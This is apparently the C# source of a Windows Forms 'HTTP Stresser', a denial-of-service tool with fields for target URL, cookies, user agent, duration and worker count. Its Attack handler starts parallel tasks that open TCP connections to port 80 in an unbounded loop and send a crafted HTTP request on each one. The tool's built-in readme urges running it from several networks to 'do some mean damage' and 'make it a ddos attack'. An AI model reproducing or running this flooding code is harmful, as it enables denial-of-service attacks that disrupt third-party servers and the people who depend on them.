using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using System.Resources;
using System.Reflection;
using System.Runtime.InteropServices;

namespace src {
    public partial class Main : Form {
        Tools tool = new Tools();
        Dash_Library Get = new Dash_Library();
        Control_Lib Misc = new Control_Lib();


        private struct Debug {
            public bool status;
            public int startuplog;
        };

        private static int selected;
        private static Boolean IsRunning = false;
        private static readonly int Red=32, Green=32, Blue=32;

        private Debug debug;

        private PictureBox department = new PictureBox();
        private Panel Layer = new Panel();

        private static Label title = new Label(), url = new Label(), 
                             duration = new Label(), cookie = new Label(), 
                             workers = new Label(), post = new Label(),
                             get = new Label(), useragent = new Label();

        private static Button quit = new Button(), minimize = new Button(),  
                              methodPOST = new Button(), methodGET = new Button(),
                              Ping = new Button(), Attack = new Button(),
                              StopAttack = new Button();

        private static TextBox Url = new TextBox(), Duration = new TextBox(), 
                               Cookie = new TextBox(), Workers = new TextBox(),
                               Status = new TextBox(), UserAgent = new TextBox();




        private String gimmealltext() {
            return
                (
                "Dashies Software 2018 © All Rights Reserved.\r\n\r\n" +

                "~===================================================~" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| this application has been built by dashie, for    |" + "\r\n" +
                "| testing purposes only, it was first intended to   |" + "\r\n" +
                "| be for personal use, but after seeing its ability |" + "\r\n" +
                "| to basically stress test web servers, i somewhat  |" + "\r\n" +
                "| thought, why not publish it, so here it is.       |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| when you put the workers too high, either the cpu |" + "\r\n" +
                "| of your device gets ripped apart, or your network |" + "\r\n" +
                "| gets a higher ping, or you are basically crashing |" + "\r\n" +
                "| the application, keep in mind that you should run |" + "\r\n" +
                "| this from several networks if you want to do some |" + "\r\n" +
                "| mean damage, lol, yeh, make it a ddos attack!     |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| and again, i will not be held responsible for     |" + "\r\n" +
                "| your script kiddie actions, lmao, maggot.         |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| oof, and just do not touch anything except for    |" + "\r\n" +
                "| the duration (in seconds) if you do not know what |" + "\r\n" +
                "| you are doing, because you may break something.   |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| lol, if the server you are attacking is actually  |" + "\r\n" +
                "| vulnerable for my methods, then you will not need |" + "\r\n" +
                "| a lot of workers, only 5 i think.                 |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "| this application will be updated in the future    |" + "\r\n" +
                "| i have a lot to do lately, so, here you go with   |" + "\r\n" +
                "| the first stable build of the HTTP Stresser.      |" + "\r\n" +
                "|                                                   |" + "\r\n" +
                "~===================================================~" + "\r\n"
                );
        }




        public Main() {
            InitializeComponent();
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());


            this.Icon = (Icon)REGEX.GetObject("icon"); // Application Icon Here
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = Color.FromArgb(Red, Green, Blue);
            this.Text = "I ❤ D✿SH";


            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));

            Get.InjectInputBox(this, "", Status, 390, 150, 375, 276, 8, 48, 48, 48, 180, 180, 180);

            Status.VisibleChanged += (sender, argumentation) => {
                if(Status.Visible) {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

            if(debug.startuplog == 0) {
                debug.startuplog = 1;
                Status.Text = gimmealltext();
            }

            department.MouseMove += (sentBy, msBeautiful) => { Misc.MiceMove(this, msBeautiful); };
            department.MouseDown += (sentBy, msBeautiful) => { Misc.MiceDown(msBeautiful); };

            Get.InjectInputBox(this, "http://www.google.co.uk", Url, 50, 65, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, url, (Url.Left + Url.Width) + 15, Url.Top, 75, 25, "URL", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "Cookie=8f75a1acb808d4f709bc4d71b9ab0343", Cookie, 50, 92, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, cookie, (Url.Left + Url.Width) + 15, Cookie.Top, 125, 25, "Cookie(s)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36", UserAgent, 50, 120, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, useragent, (UserAgent.Left + UserAgent.Width) + 15, UserAgent.Top, 125, 25, "User-Agent", 10, 28, 28, 28, 255, 255, 255);

            // Stop does not work either.
            // Add Custom Port here.
            // Add HTTPS Support
            // Add Socket, UDP and TCP, HTTP Header Methods.

            Get.InjectInputBox(this, "265", Duration, 50, 182, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, duration, (Duration.Left + Duration.Width) + 15, Duration.Top, 75, 25, "Seconds (seconds)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "5", Workers, 50, 204, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, workers, (Workers.Left + Workers.Width) + 15, Workers.Top, 75, 25, "Workers (processes)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, methodPOST, " ", 50, 251, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, post, (methodPOST.Left+methodPOST.Width)+15, methodPOST.Top, 200, 18, "Use HTTP Method POST", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, methodGET, " ", 50, 275, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, get, (methodPOST.Left+methodPOST.Width)+15, methodGET.Top, 200, 18, "Use HTTP Method GET", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, Ping, "Ping Target", 50, 315, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, Attack, "Attack Target", 185, 315, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, StopAttack, "Stop Attack", 50, 349, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectPanel(this, Layer, 35, 47, this.Width-70, this.Height-70, 28, 28, 28);

            debug.status = Get.InjectText(this, title, 0, 2, 285, 22, "(c) All Rights Reserved, Dashies Software Inc.", 8, 102, 35, 178, 255, 255, 255);
            if(debug.status != true) { /* Notification UI : Form here once ready */ }

            debug.status = Get.InjectButton(this, quit, "X", this.Width-74, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if(debug.status != true) { /* Notification UI : Form here once ready */ }

            debug.status = Get.InjectButton(this, minimize, "-", this.Width-148, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if(debug.status != true) { /* Notification UI : Form here once ready */ }

            debug.status = Get.CreateMenu(this, 0, 0, this.Width, 24, department, ("profile"), 28, 24, 1, 102, 35, 178); // Profile Icon Here
            if(debug.status != true) { /* Notification UI : Form here once ready */ }

            selected = 1;
            methodPOST.Text = Get.GimmeUnicode();

            methodPOST.Click += (sentBy, beautifulPony) => {
                if(selected != 1) {
                    methodGET.Text = " ";
                    methodPOST.Text = Get.GimmeUnicode();
                    selected = 1;
                } 
            };

            methodGET.Click += (sentBy, beautifulPony) => {
                if(selected != 2) {
                    methodGET.Text = Get.GimmeUnicode();
                    methodPOST.Text = " ";
                    selected = 2;
                }    
            };

            Ping.Click += (sentby, msbeautiful) => {
                if(FormatUrl(Url.Text) == true) {
                    Pawng ping = new Pawng(Url.Text);
                    ping.ShowDialog();
                    Url.Text = "http://www.google.com";
                }
            };

            StopAttack.Click += (sentby, thicc) => {
                if(IsRunning == false) {
                    Status.AppendText("* the server is not even running, ahaha :o\r\n");
                } else {
                    timeout = true;
                    IsRunning = false;
                    Status.AppendText("* Received your stop signal, this may take 5 seconds!\r\n");

                }
            };

            Attack.Click += (sentby, msbeautiful) => {
                if(IsRunning == true) { 
                    Status.AppendText("* Ugh, you are already over running the server my lady.\r\n");
                } else {
                    if(FormatUrl(Url.Text) == true) {
                        String Method = String.Empty;

                        if(selected == 1) Method = "POST";
                        else Method = "GET";

                        Send = $"{Method} / HTTP/1.1\r\n" + 
                               $"Host: {Url.Text.Replace("http://", "")}\r\n" + 
                               "Connection: keep-alive\r\n" +
                               "Upgrade-Insecure-Requests: 1\r\n" +
                               $"User-Agent: {UserAgent.Text}\r\n" + //Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\r\n" +
                               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
                               "accept-encoding: gzip,deflate\r\n" +
                               "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n" +
                               $"Cookie: {Cookie.Text}; CAKEPHP=uglkh2asdasdassaadgksdjklgjklsdjklsdfhkljsfhjklfhsjklsfhjkljklsfhjklsfhjklfshjklfshjklsfhjklsfjklsfjklsfhkljhvkkslb4qevumf0pr4e4; _pk_id.2.9278=482ceb68ec2fb4f4.1481370495.1.1481371739.1481370495.; _pk_ses.2.9278=*\r\n\r\n";

                        Status.AppendText("========================================================\r\n\r\n");
                        Status.AppendText("* The following header will be used, please make sure it correct as any mistakes can harm the applications performance horribly.\r\n\r\n");
                        Status.AppendText(Send);
                        Status.AppendText("========================================================\r\n\r\n");

                        IsRunning = true;
                        Status.AppendText("* Initializing Attack ....\r\n");

                        for(int index = 0; index <= Convert.ToInt32(Workers.Text); index += 1) {
                            Task run = Task.Run((Action)fire);    
                        }

                        Task duration = Task.Run((Action)timer);
                    }
                }
            };

            Duration.TextChanged += (sent, mystical) => {
                try {
                    if((Duration.Text.All(char.IsDigit) != true) && (Workers.Text != "")) {
                        ToolTip tooltip = new ToolTip {
                            UseAnimation = true,
                            UseFading = true,
                            ToolTipTitle = "Invalid Input"
                        };

                        tooltip.Show("only accepts numeric!", Duration, 0, -0, 1000);
                        Duration.Text = "265";
                    }
                } catch { }
            };

            Workers.TextChanged += (sent, mystical) => {
                try {
                    if((Workers.Text.All(char.IsDigit) != true) && (Workers.Text != "")) {
                        ToolTip tooltip = new ToolTip {
                            UseAnimation = true,
                            UseFading = true,
                            ToolTipTitle = "Invalid Input"
                        };

                        tooltip.Show("only accepts numeric!", Workers, 0, -0, 1000);
                        Workers.Text = "40";
                    } else if(Convert.ToInt32(Workers.Text) >= 150) MessageBox.Show("You do know that this amount of processes can either crash your network or your device? just saying x)", "Lol");
                } catch { }
            };

            quit.Click += (sentBy, msValentine) => { this.Close(); };
            minimize.Click += (sentBy, msValentine) => { this.SendToBack(); };
        }




        private static Boolean timeout = false;
        private static String Send = String.Empty;




        private static void timer() { 
            Status.AppendText("* Attack has started successfully!\r\n");

            System.Threading.Thread.Sleep(Convert.ToInt32(Duration.Text)*1000); 

            IsRunning = false;
            timeout = true;

            Status.AppendText("* Attack has stopped successfully!\r\n");
        }




        private static void fire() {
            try {
                while(timeout == false) {
                    String Target = String.Empty;

                    Uri grabIp = new Uri(Url.Text);
                    var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];

                    IPHostEntry entry = Dns.GetHostEntry(ipResult);
                    Socket longthicchighsocks = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                      
                    longthicchighsocks.Connect(entry.AddressList[0], 80);
                    longthicchighsocks.Send(Encoding.ASCII.GetBytes(Send));
                }
            } catch { fire(); }
        }

        private Boolean FormatUrl(String uri) {
            ToolTip tooltip = new ToolTip {
                 UseAnimation = true,
                 UseFading = true,
                 ToolTipTitle = "Invalid Input"
            };

            if(uri.Contains("http://") != true) { tooltip.Show("only accepts HTTP Urls!", Url, 0, -0, 1000); return false;  }

            try { Uri arwl = new Uri(uri); Dns.GetHostAddresses(arwl.Host); }
            catch { tooltip.Show("host seems offline!", Url, 0, -0, 1000); return false;  }

            return true;
        }
    }




    public class Pawng : Form {
        private Tools tool = new Tools();
        private Dash_Library get = new Dash_Library();
        private Button quit = new Button();
        public static TextBox Status = new TextBox();
        public static String target = String.Empty, url = String.Empty;

        public Pawng(String Target) {
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());

            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.None;

            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));

            this.BackColor = Color.FromArgb(16, 16, 16);
            this.ForeColor = Color.FromArgb(255, 255, 255);

            this.Size = new Size(500, 300);
            this.Font = new Font("Consolas", 10);

            get.InjectInputBox(this, "", Status, 0, 21, this.Width, this.Height-21, 9, 22, 22, 22, 200, 200, 200);

            Status.VisibleChanged += (sender, argumentation) => {
                if(Status.Visible) {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

            get.InjectButton(this, quit, "X", this.Width-74, -3, 74, 24, 12, 16, 16, 16, 255, 255, 255, 24, 24, 24, 255, 255, 255);

            Uri uri = new Uri(Target);
            var Ip = Dns.GetHostAddresses(uri.Host)[0];
            url = Target;
            target = Ip.ToString();

            Status.AppendText($"* we are going to ping {Target} / {target}!\r\n");
            Status.AppendText("* with 74 bytes, 8 cycles all over ICMPv4.\r\n\r\n");

            var Tokend = new CancellationTokenSource();
            CancellationToken Ct = Tokend.Token;

            Task Pinger = Task.Run((Action)RunMeh, Tokend.Token);

            quit.Click += (sender, argumentation) => {
                Tokend.Cancel();
                this.Close();
            };
        }

        static void RunMeh() {
            for(int index = 0; index <= 7; index += 1) {
                Ping pingah = new Ping();
                PingReply reply = pingah.Send(target, 1000);

                if (reply.Status != IPStatus.Success) Status.AppendText($"[{index}] no reply has been received from {url}!\r\n");
                else { Status.AppendText($"[{index}] we have received a reply from {url} in {reply.RoundtripTime}ms!\r\n"); System.Threading.Thread.Sleep(500); }

                pingah.Dispose();
            }

            Status.AppendText("\r\n* the results are shown above!\r\n");
            Status.AppendText("* we have successfully pinged the target.");
        }
    }
    



    public partial class Notification_UI : Form {
        public Notification_UI() {
            // for the next update c:
        }
    }




    public partial class Tools {
        [DllImport("user32.dll")]
        static extern IntPtr CreateIconFromResource(byte[] presbits, uint dwResSize, bool fIcon, uint dwVer);

        public void SetFormCursor(Form Inject, byte[] Target) {
            IntPtr GET = CreateIconFromResource(Target, (uint)Target.Length, false, 0x00030000);
            Cursor SET = new Cursor(GET);
            Inject.Cursor = SET;
            return ;
        }
    }
}
